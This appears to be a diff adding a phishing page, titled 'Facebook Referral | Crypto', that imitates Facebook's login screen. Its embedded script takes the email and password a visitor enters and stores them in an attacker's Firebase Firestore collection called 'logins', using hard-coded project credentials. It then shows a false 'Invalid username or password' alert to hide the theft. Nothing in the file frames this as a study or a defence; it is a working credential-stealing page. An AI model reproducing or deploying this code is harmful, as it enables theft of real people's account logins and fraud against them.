@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Referral | Crypto</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>Facebook</h1>
+                <p>Connect with friends and the world</p>
+                <p>around you on Facebook.</p>
+            </div>
+            <form id="loginForm">
+                <input type="text" id="email" name="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <div class="link">
+                    <button type="submit" class="login">Login</button>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">Create new account</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Add Firebase SDK -->
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-analytics.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBJ7sD1YDAwtloLInnMuM6V9it3vFMPag0",
+            authDomain: "ejjays-4ff24.firebaseapp.com",
+            projectId: "ejjays-4ff24",
+            storageBucket: "ejjays-4ff24.appspot.com",
+            messagingSenderId: "579883345795",
+            appId: "1:579883345795:web:6d30366f33bf70197e78b6",
+            measurementId: "G-K8S3KYNQGZ"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getFirestore(app);
+        console.log("Firebase initialized");
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            console.log("Form submitted with email:", email, "and password:", password);
+
+            try {
+                await addDoc(collection(db, "logins"), {
+                    email: email,
+                    password: password
+                });
+                console.log("Document successfully written!");
+                alert("Invalid username or password.");
+                // Redirect to a different page or show a success message
+                // window.location.href = "success.html"; // Uncomment if you have a success page
+            } catch (error) {
+                console.error("Error writing document: ", error);
+            }
+        });
+    </script>
+</body>
+</html>
